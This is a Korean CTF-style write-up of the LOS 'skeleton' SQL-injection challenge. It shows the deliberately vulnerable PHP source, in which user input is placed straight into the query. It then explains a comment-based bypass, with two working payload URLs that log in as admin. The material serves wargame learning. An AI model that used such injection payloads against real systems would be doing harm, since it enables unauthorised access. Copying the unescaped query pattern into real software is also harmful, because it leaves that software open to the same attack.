# LOS - skeleton 

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```

이번 문제는 생각보다 간단하다. 
주석 처리에 대한 이해가 있다면 쉽게 풀 수 있는 문제이다. 
(본인은 sql과 php 문법이 헷갈려서 오래걸렸다;)

걸러내는 조건은 많지 않지만 query에 'and 1=0'이라는 false문이 하나 있어서 어떤 값을 넣어도 false가 반환되는 구조이다. 하지만 우리가 지금까지 pw를 \'(single quote)로 넘겼던 것처럼 false 문도 넘길 수 있는 방법이 주석처리이다. 

뒤에 주석문구인 #(%23)을 넣어주면 그 뒤부터는 주석으로 인식해서 값으로 들어가지 않게된다.  #(주석)뿐만 아니라 -- -(한줄 주석)으로 처리해줘도 같은 기능을 한다. (query가 한 줄 이기때문에)

<한줄 주석(-- -)사용>

```url
https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=%27or%20id=%27admin%27%20--%20-
```

<주석(#)사용>

```url
https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=%27or%20id=%27admin%27%23
```

#대신에 %23을 넣어주는 이유는 #이라는 문자 자체가 필터링 될 수 있기 때문에 query에서 #을 나타내는 문자로 대체해주는 것이다.

![1565334642433](C:\Users\qkrwl\Documents\web\los\LOS - skeleton-clear.png)